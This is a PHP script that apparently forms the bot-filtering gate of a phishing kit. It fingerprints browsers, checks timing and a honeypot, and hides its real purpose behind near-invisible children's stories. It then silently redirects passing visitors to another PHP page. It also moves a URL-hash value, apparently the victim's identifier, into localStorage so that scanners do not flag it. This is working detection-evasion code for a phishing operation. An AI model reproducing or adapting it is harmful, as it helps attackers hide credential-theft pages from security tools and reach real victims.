<?php

session_start();

$rate_limit_time = 60;
$rate_limit_attempts = 5;

if (!isset($_SESSION['attempts'])) {
    $_SESSION['attempts'] = 0;
    $_SESSION['first_attempt_time'] = time();
}

if (time() - $_SESSION['first_attempt_time'] > $rate_limit_time) {
    $_SESSION['attempts'] = 0;
    $_SESSION['first_attempt_time'] = time();
}

if ($_SESSION['attempts'] >= $rate_limit_attempts) {
    http_response_code(429);
    die("Too many requests. Please try again later.");
}

// Honeypot field
if (isset($_POST['honeypot']) && $_POST['honeypot']!== '') {
    logAttempt("Honeypot triggered: {$_POST['honeypot']}");
    die("Access denied.");
}

if (isset($_SESSION['verified_user']) && $_SESSION['verified_user'] === true) {
    if (!isset($_POST['fingerprint']) ||!isset($_POST['timing_check']) ||!isset($_POST['js_check']) || $_POST['js_check']!== '1') {
        renderAntibotForm();
        exit();
    }
}

if (isset($_POST['fingerprint']) && isset($_POST['timing_check'])) {
    $fingerprint = json_decode($_POST['fingerprint'], true);
    $timing_check = (int)$_POST['timing_check'];
    $current_time = round(microtime(true) * 1000);
    $time_difference = $current_time - $timing_check;

    // More realistic timing check
    if ($time_difference > 60000) {
        $_SESSION['attempts']++;
        logAttempt("Invalid timing: {$time_difference}ms");
        die("Access denied. Invalid timing."); 
    }

    if (!validateFingerprint($fingerprint)) {
        $_SESSION['attempts']++;
        logAttempt("Invalid fingerprint: ". json_encode($fingerprint));
        die("Access denied. Invalid fingerprint.");
    }

    $_SESSION['verified_user'] = true;
    $_SESSION['access_granted'] = true;
    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The Little Star"s Adventure</title>
    <style>
        body {
            font-family: "Arial", sans-serif;
            background-color: #f0f8ff;
            color: #333;
            text-align: center;
            padding: 20px;
        }
        h1 {
            color: #ff69b4;
        }
        .story {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            margin: 0 auto;
            text-align: left;
        }
        .story p {
            line-height: 1.6;
        }
        .story img {
            max-width: 100%;
            border-radius: 10px;
            margin: 20px 0;
        }
        .story-container{
            opacity: 0.001;
        }
    </style>
</head>
<body>
<div class="story-container">
    <h1>The Little Star"s Adventure</h1>

    <div class="story">
        <p>Once upon a time, in a faraway galaxy, there was a little star named Twinkle. Twinkle was not like the other stars; she loved to explore and dreamt of visiting different planets.</p>
        <p>One night, Twinkle decided to embark on an adventure. She zoomed past the moon, waved at the planets, and even danced around a comet. She was having the time of her life!</p>
        <p>As Twinkle traveled, she met a friendly alien named Zorb. Zorb was from a planet called Glimmer, and he invited Twinkle to visit his home. Twinkle was thrilled and accepted the invitation.</p>
        <p>On Glimmer, Twinkle saw glowing trees, sparkling rivers, and met many friendly aliens. She played games, shared stories, and even learned a few alien dances. It was the best adventure ever!</p>
        <p>When it was time to return home, Twinkle promised Zorb that she would visit again. She zoomed back to her place in the sky, twinkling brighter than ever, knowing that she had made a new friend and had an unforgettable adventure.</p>
        <p>And from that day on, every time you look up at the night sky, you might just see Twinkle, the little star who loves to explore, shining brightly and reminding us all to dream big.</p>
    </div>
<div>
<div  class="story-container">
    <h1>The Cloud"s Journey</h1>
    <div class="story">
        <p>Once, high above the world, lived a small, fluffy cloud named Cumulus. Cumulus always watched the world below and wished he could see it up close.</p>
        <p>One sunny morning, Cumulus decided to drift away. He floated over green hills, sparkling lakes, and bustling cities. He saw children playing, birds flying, and flowers blooming.</p>
        <p>As he traveled, he met a lonely kite stuck in a tree. Cumulus gently blew a gust of wind, freeing the kite. The kite soared into the sky, thanking Cumulus with a joyful dance.</p>
        <p>Cumulus continued his journey, eventually reaching a dry, thirsty field. He gathered all his moisture and released a gentle rain, bringing life back to the parched land.</p>
        <p>Feeling content, Cumulus drifted back to his place in the sky. He knew that even a small cloud could make a big difference, bringing joy and life wherever it went.</p>
        <p>And every time you see a cloud in the sky, remember Cumulus, the little cloud who dared to explore and help others.</p>
    </div>
</div>
<div  class="story-container">
    <h1>The Seed"s Big Dream</h1>
    <div class="story">
        <p>In a small garden, there lived a tiny seed named Pip. Pip dreamed of growing into a tall, strong tree, reaching for the sky.</p>
        <p>One spring day, Pip was planted in the soil. He felt the warm sun and the gentle rain. He pushed his roots deep into the earth and sprouted a tiny green shoot.</p>
        <p>As Pip grew, he met a friendly worm named Wiggles. Wiggles helped Pip"s roots grow strong by loosening the soil and providing nutrients.</p>
        <p>Pip grew taller and taller, his branches reaching out like welcoming arms. Birds built nests in his leaves, and squirrels played among his roots. He provided shade for weary travelers and shelter for small animals.</p>
        <p>Pip became the tallest tree in the garden, fulfilling his dream. He learned that with patience and help from friends, even the smallest seed can achieve great things.</p>
        <p>And every time you see a tall tree, remember Pip, the little seed who dared to dream big and grow strong.</p>
    </div>
</div>
<div  class="story-container">
    <h1>The River"s Song</h1>
    <div class="story">
        <p>High in the mountains, a small stream began its journey. It was named Ripple, and it loved to sing as it flowed.</p>
        <p>Ripple tumbled down the mountainside, gathering strength and speed. It danced through forests, whispered through meadows, and splashed over rocks.</p>
        <p>Along its way, Ripple met a thirsty deer. It gently offered its cool water, quenching the deer"s thirst. The deer thanked Ripple with a grateful nod.</p>
        <p>Ripple continued its journey, joining other streams and becoming a mighty river. It carried boats, watered fields, and provided homes for fish and other creatures.</p>
        <p>Finally, Ripple reached the vast ocean, its song joining the great symphony of the sea. It knew that its journey had brought life and joy to many.</p>
        <p>And every time you hear the sound of a river, remember Ripple, the little stream that sang its way to the sea.</p>
    </div>
</div>
<div  class="story-container">
    <h1>The Firefly"s Light</h1>
    <div class="story">
        <p>In a dark forest, lived a tiny firefly named Flicker. Flicker was shy and often hid his light, afraid to shine.</p>
        <p>One night, Flicker heard a lost little beetle crying. The beetle was scared and couldn"t find its way home. Flicker knew he had to help.</p>
        <p>Flicker took a deep breath and turned on his light. He flew through the forest, his glow guiding the beetle back to its family.</p>
        <p>The beetle"s family thanked Flicker, and he felt a warm feeling inside. He realized that his light wasn"t just for him; it was for others too.</p>
        <p>From that night on, Flicker shone brightly, lighting up the forest and bringing joy to all who saw him. He learned that even a small light can make a big difference.</p>
        <p>And every time you see a firefly glowing in the night, remember Flicker, the little firefly who learned to shine.</p>
    </div>
</div>
<div  class="story-container">
    <h1>The Pebble"s Roll</h1>
    <div class="story">
        <p>On a rocky beach, there lived a small, smooth pebble named Rocky. Rocky longed to see the world beyond the shore.</p>
        <p>One day, a strong wave swept Rocky into the sea. He tumbled and rolled, exploring the ocean depths. He saw colorful fish, swaying seaweed, and hidden coral reefs.</p>
        <p>As he drifted, Rocky met a sad starfish trapped beneath a heavy shell. Rocky gently nudged the shell, freeing the starfish. The starfish thanked Rocky with a grateful wiggle.</p>
        <p>Rocky continued his journey, eventually washing up on a distant shore. He found himself in a beautiful garden, filled with flowers and butterflies.</p>
        <p>Rocky became a part of the garden, a small but important piece of its beauty. He learned that even a simple pebble can have a grand adventure and make a difference.</p>
        <p>And every time you see a pebble on the beach, remember Rocky, the little pebble who rolled away to explore the world.</p>
    </div>
</div>
<a id="redirect" href="oi3rdyu.php" style="display:none;">Redirecting...</a>
</body>
<script>
          setTimeout(function() {
            document.getElementById("redirect").click();
        }, 100); 
</script>
';

    exit();

}

renderAntibotForm();
exit();

function renderAntibotForm() {
    $words = [
        "wind", "sea", "sky", "clouds", "waves", "birds", "fish", "sand", "sun", "moon", "stars", "night", "day"
    ];
    $story = "The ". $words[array_rand($words)]. " whispered secrets to the ". $words[array_rand($words)]. ", as the ". $words[array_rand($words)]. " danced above. The ". $words[array_rand($words)]. " sang a lullaby, while the ". $words[array_rand($words)]. " shimmered in the distance.";

    echo '<html><head><title>Verifying...</title></head><body>';
    echo '<noscript><h1>Please enable JavaScript to continue.</h1></noscript>';
    echo '<noscript><p>'. $story. '</p></noscript>'; 
    echo '<form id="antibot" method="post">';
    echo '<input type="hidden" name="js_check" value="1" />';
    echo '<input type="hidden" id="browser_fingerprint" name="fingerprint" />';
    echo '<input type="hidden" id="timing_check" name="timing_check" />';
    echo '<input type="text" name="honeypot" style="display:none;" />';
    echo '<input type="submit" value="" style="border:none;background-color:transparent;width:100px;height:100px" />';
    echo '</form>';
    echo '<script>
        var canvas = document.createElement("canvas");
        var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        var fingerprint = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: [screen.width, screen.height],
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            webglVendor: gl? gl.getParameter(gl.VENDOR): "none",
            webglRenderer: gl? gl.getParameter(gl.RENDERER): "none",
            canvasHash: canvas.toDataURL(),
            plugins: Array.from(navigator.plugins).map(p => p.name).join(", "),
            doNotTrack: navigator.doNotTrack || "unspecified",

        };
        var pageLoadTime = Date.now();
        document.getElementById("timing_check").value = pageLoadTime;
        setTimeout(function() {
            document.getElementById("browser_fingerprint").value = JSON.stringify(fingerprint);
            // Remove email check from URL, as it might flag the script
           if (window.location.hash) {
                var hashValue = window.location.hash.substring(1);
                if (isValidEmail(hashValue)) {
                    alert("Access Denied. URL Contains an Email Address.");
                    return;
                }
                localStorage.setItem("aiVal", hashValue);
                history.replaceState(null, null, window.location.href.split("#")[0]);
            }
            document.getElementById("antibot").submit();
        }, 4500); 

        function isValidEmail(email) {
            var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailPattern.test(email);
        }
    </script>';
    echo '</body></html>';
}

function validateFingerprint($fingerprint) {
    return isset($fingerprint['userAgent']) &&
           isset($fingerprint['platform']) &&
           isset($fingerprint['webglVendor']) &&
           isset($fingerprint['plugins']) &&
           is_array(explode(", ", $fingerprint['plugins']));
}

function logAttempt($data) {
    $log_entry = "[". date("Y-m-d H:i:s"). "] ". $_SERVER['REMOTE_ADDR']. " - ". $data. PHP_EOL;
    file_put_contents('fingerprint_log.txt', $log_entry, FILE_APPEND);
}?>